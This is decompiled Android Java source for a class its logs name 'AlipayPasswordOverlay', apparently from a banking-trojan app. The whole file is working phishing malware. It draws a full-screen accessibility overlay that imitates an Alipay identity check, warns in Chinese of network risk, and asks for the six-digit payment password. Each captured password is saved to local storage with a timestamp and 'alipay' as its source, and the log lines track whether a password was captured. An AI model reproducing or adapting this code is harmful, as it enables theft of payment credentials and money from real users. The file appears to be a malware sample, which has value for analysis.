package com.storm.safe.rock.service.modules.overlay;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import kotlin.AbstractC0767a0;
import okhttp3.HttpUrl;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0716jf;
import p000.C1205s3;
import p000.RunnableC1172r9;
import p000.ViewOnClickListenerC1202s0;
import p000.ViewOnClickListenerC1203s1;
import p000.ViewOnClickListenerC1204s2;
import p000.t60;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.overlay.a0 */
/* loaded from: classes2.dex */
public final class C0353a0 {

    /* renamed from: b0 */
    public static final C1205s3 f53609b0 = new C1205s3(null);

    /* renamed from: b1 */
    public static volatile C0353a0 f53610b1;

    /* renamed from: a0 */
    public final Context f53611a0;

    /* renamed from: a1 */
    public final WindowManager f53612a1;

    /* renamed from: a2 */
    public FrameLayout f53613a2;

    /* renamed from: a3 */
    public boolean f53614a3;

    /* renamed from: a6 */
    public TextView f53617a6;

    /* renamed from: a9 */
    public final Handler f53620a9;

    /* renamed from: a4 */
    public String f53615a4 = "";

    /* renamed from: a5 */
    public final ArrayList f53616a5 = new ArrayList();

    /* renamed from: a7 */
    public final Handler f53618a7 = new Handler(Looper.getMainLooper());

    /* renamed from: a8 */
    public final y90 f53619a8 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.overlay.AlipayPasswordOverlay$density$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return Float.valueOf(this.f53607a0.f53611a0.getResources().getDisplayMetrics().density);
        }
    });

    public C0353a0(Context context) {
        this.f53611a0 = context;
        Object systemService = context.getSystemService("window");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
        this.f53612a1 = (WindowManager) systemService;
        this.f53620a9 = new Handler(Looper.getMainLooper());
    }

    /* renamed from: a0 */
    public final void m211895a0() {
        int i;
        String str;
        Context context = this.f53611a0;
        FrameLayout frameLayout = new FrameLayout(context);
        frameLayout.setBackgroundColor(Color.parseColor("#80000000"));
        frameLayout.setOnClickListener(new ViewOnClickListenerC1202s0(0));
        LinearLayout linearLayout = new LinearLayout(context);
        linearLayout.setOrientation(1);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(-1);
        gradientDrawable.setCornerRadii(new float[]{m211896a1(16), m211896a1(16), m211896a1(16), m211896a1(16), 0.0f, 0.0f, 0.0f, 0.0f});
        linearLayout.setBackground(gradientDrawable);
        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(-1, -2);
        layoutParams.gravity = 80;
        linearLayout.setLayoutParams(layoutParams);
        RelativeLayout relativeLayout = new RelativeLayout(context);
        relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(-1, m211896a1(50)));
        relativeLayout.setPadding(m211896a1(16), m211896a1(12), m211896a1(16), 0);
        TextView textView = new TextView(context);
        textView.setText("×");
        textView.setTextSize(26.0f);
        textView.setTextColor(Color.parseColor("#999999"));
        int i2 = 17;
        textView.setGravity(17);
        RelativeLayout.LayoutParams layoutParams2 = new RelativeLayout.LayoutParams(m211896a1(40), m211896a1(40));
        layoutParams2.addRule(20);
        layoutParams2.addRule(15);
        textView.setLayoutParams(layoutParams2);
        textView.setOnClickListener(new ViewOnClickListenerC1203s1(0, this));
        TextView textView2 = new TextView(context);
        textView2.setText("身份安全认证");
        textView2.setTextSize(18.0f);
        textView2.setTextColor(-16777216);
        textView2.setGravity(17);
        RelativeLayout.LayoutParams layoutParams3 = new RelativeLayout.LayoutParams(-2, -2);
        layoutParams3.addRule(13);
        textView2.setLayoutParams(layoutParams3);
        relativeLayout.addView(textView);
        relativeLayout.addView(textView2);
        TextView textView3 = new TextView(context);
        textView3.setText("检测到您当前网络存在风险，请输入支付\n密码确认身份");
        textView3.setTextSize(14.0f);
        textView3.setTextColor(Color.parseColor("#666666"));
        textView3.setGravity(17);
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams4.topMargin = m211896a1(16);
        layoutParams4.bottomMargin = m211896a1(24);
        textView3.setLayoutParams(layoutParams4);
        int i3 = context.getResources().getDisplayMetrics().widthPixels;
        int iM211896a1 = m211896a1(24);
        int iM211896a12 = ((i3 - (iM211896a1 * 2)) - (m211896a1(8) * 5)) / 6;
        LinearLayout linearLayout2 = new LinearLayout(context);
        linearLayout2.setOrientation(0);
        linearLayout2.setGravity(17);
        linearLayout2.setPadding(iM211896a1, 0, iM211896a1, 0);
        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams5.bottomMargin = m211896a1(8);
        linearLayout2.setLayoutParams(layoutParams5);
        int i4 = 0;
        for (int i5 = 6; i4 < i5; i5 = 6) {
            TextView textView4 = new TextView(context);
            textView4.setTextSize(24.0f);
            textView4.setTextColor(-16777216);
            textView4.setGravity(17);
            GradientDrawable gradientDrawable2 = new GradientDrawable();
            gradientDrawable2.setColor(Color.parseColor("#F5F5F5"));
            gradientDrawable2.setCornerRadius(m211896a1(i5));
            if (i4 == 0) {
                gradientDrawable2.setStroke(m211896a1(2), Color.parseColor("#1677FF"));
            }
            textView4.setBackground(gradientDrawable2);
            LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(iM211896a12, iM211896a12);
            layoutParams6.setMarginStart(i4 == 0 ? 0 : m211896a1(8));
            textView4.setLayoutParams(layoutParams6);
            this.f53616a5.add(textView4);
            linearLayout2.addView(textView4);
            i4++;
        }
        TextView textView5 = new TextView(context);
        textView5.setText("");
        textView5.setTextSize(14.0f);
        textView5.setTextColor(Color.parseColor("#FF4444"));
        textView5.setGravity(17);
        textView5.setVisibility(8);
        textView5.setPadding(0, m211896a1(8), 0, m211896a1(8));
        LinearLayout.LayoutParams layoutParams7 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams7.topMargin = m211896a1(8);
        layoutParams7.bottomMargin = m211896a1(8);
        textView5.setLayoutParams(layoutParams7);
        this.f53617a6 = textView5;
        LinearLayout linearLayout3 = new LinearLayout(context);
        linearLayout3.setOrientation(1);
        String str2 = "#F0F0F0";
        linearLayout3.setBackgroundColor(Color.parseColor("#F0F0F0"));
        linearLayout3.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        String str3 = "DEL";
        String[][] strArr = {new String[]{"1", "2", "3"}, new String[]{"4", "5", "6"}, new String[]{"7", "8", "9"}, new String[]{"", "0", "DEL"}};
        int i6 = 0;
        while (i6 < 4) {
            String[] strArr2 = strArr[i6];
            LinearLayout linearLayout4 = new LinearLayout(context);
            linearLayout4.setOrientation(0);
            linearLayout4.setGravity(i2);
            String[][] strArr3 = strArr;
            linearLayout4.setLayoutParams(new LinearLayout.LayoutParams(-1, m211896a1(55)));
            int length = strArr2.length;
            int i7 = 0;
            while (i7 < length) {
                String str4 = strArr2[i7];
                int i8 = length;
                TextView textView6 = new TextView(context);
                if (t60.m214686a2(str4, str3)) {
                    i = i7;
                    str = "⌫";
                } else {
                    i = i7;
                    str = str4;
                }
                textView6.setText(str);
                textView6.setTextSize(t60.m214686a2(str4, str3) ? 20.0f : 24.0f);
                textView6.setTextColor(-16777216);
                textView6.setGravity(17);
                textView6.setBackgroundColor(str4.length() == 0 ? Color.parseColor(str2) : -1);
                String str5 = str2;
                String[] strArr4 = strArr2;
                int i9 = i6;
                LinearLayout.LayoutParams layoutParams8 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                String str6 = str3;
                FrameLayout frameLayout2 = frameLayout;
                layoutParams8.setMargins(m211896a1(1), m211896a1(1), m211896a1(1), m211896a1(1));
                textView6.setLayoutParams(layoutParams8);
                if (str4.length() > 0) {
                    textView6.setOnClickListener(new ViewOnClickListenerC1204s2(this, str4, 0));
                }
                linearLayout4.addView(textView6);
                i7 = i + 1;
                i6 = i9;
                length = i8;
                str2 = str5;
                strArr2 = strArr4;
                str3 = str6;
                frameLayout = frameLayout2;
            }
            linearLayout3.addView(linearLayout4);
            i6++;
            strArr = strArr3;
            str2 = str2;
            i2 = 17;
        }
        FrameLayout frameLayout3 = frameLayout;
        View view = new View(context);
        view.setBackgroundColor(Color.parseColor(str2));
        view.setLayoutParams(new LinearLayout.LayoutParams(-1, m211896a1(20)));
        linearLayout.addView(relativeLayout);
        linearLayout.addView(textView3);
        linearLayout.addView(linearLayout2);
        linearLayout.addView(this.f53617a6);
        linearLayout.addView(linearLayout3);
        linearLayout.addView(view);
        frameLayout3.addView(linearLayout);
        this.f53613a2 = frameLayout3;
        WindowManager.LayoutParams layoutParams9 = new WindowManager.LayoutParams();
        layoutParams9.width = -1;
        layoutParams9.height = -1;
        layoutParams9.type = 2032;
        layoutParams9.format = -3;
        layoutParams9.gravity = 8388659;
        layoutParams9.flags = 262912;
        WindowManager windowManager = this.f53612a1;
        if (windowManager != null) {
            windowManager.addView(this.f53613a2, layoutParams9);
        }
    }

    /* renamed from: a1 */
    public final int m211896a1(int i) {
        return (int) (((Number) this.f53619a8.getValue()).floatValue() * i);
    }

    /* renamed from: a2 */
    public final void m211897a2(boolean z) {
        if (this.f53614a3) {
            this.f53614a3 = false;
            t60.m214702c3("AlipayPasswordOverlay", "🔒 隐藏密码框，passwordCaptured=" + z);
            if (!z) {
                t60.m214702c3("AlipayPasswordOverlay", "📅 安排 2 秒后重新检查弹窗");
                this.f53620a9.postDelayed(new RunnableC1172r9(this, 0), 2000L);
            }
            this.f53618a7.post(new RunnableC1172r9(this, 1));
        }
    }

    /* renamed from: a3 */
    public final void m211898a3(String str, String str2, long j) {
        String str3 = HttpUrl.PATH_SEGMENT_ENCODE_SET_URI;
        try {
            SharedPreferences sharedPreferences = this.f53611a0.getSharedPreferences(StringUtil.m212470a0("J1YSMXIoDT1EJiRLFQVFMR86WCMy"), 0);
            String string = sharedPreferences.getString("history", HttpUrl.PATH_SEGMENT_ENCODE_SET_URI);
            if (string != null) {
                str3 = string;
            }
            JSONArray jSONArray = new JSONArray(str3);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("password", str);
            jSONObject.put("type", str2);
            jSONObject.put("timestamp", j);
            jSONObject.put("source", "alipay");
            jSONArray.put(jSONObject);
            SharedPreferences.Editor editorEdit = sharedPreferences.edit();
            editorEdit.putString("history", jSONArray.toString());
            editorEdit.putInt("count", jSONArray.length());
            editorEdit.apply();
        } catch (Exception e) {
            t60.m214705c6("AlipayPasswordOverlay", "❌ 保存密码历史记录失败", e);
        }
    }

    /* renamed from: a4 */
    public final void m211899a4() {
        int i = 0;
        while (i < 6) {
            ArrayList arrayList = this.f53616a5;
            t60.m214695b6(arrayList, "<this>");
            TextView textView = (TextView) ((i < 0 || i > AbstractC0716jf.m213305g4(arrayList)) ? null : arrayList.get(i));
            if (textView != null) {
                textView.setText(i < this.f53615a4.length() ? "●" : "");
                GradientDrawable gradientDrawable = new GradientDrawable();
                gradientDrawable.setColor(Color.parseColor("#F5F5F5"));
                gradientDrawable.setCornerRadius(m211896a1(6));
                if (i == this.f53615a4.length() && this.f53615a4.length() < 6) {
                    gradientDrawable.setStroke(m211896a1(2), Color.parseColor("#1677FF"));
                }
                textView.setBackground(gradientDrawable);
            }
            i++;
        }
    }
}
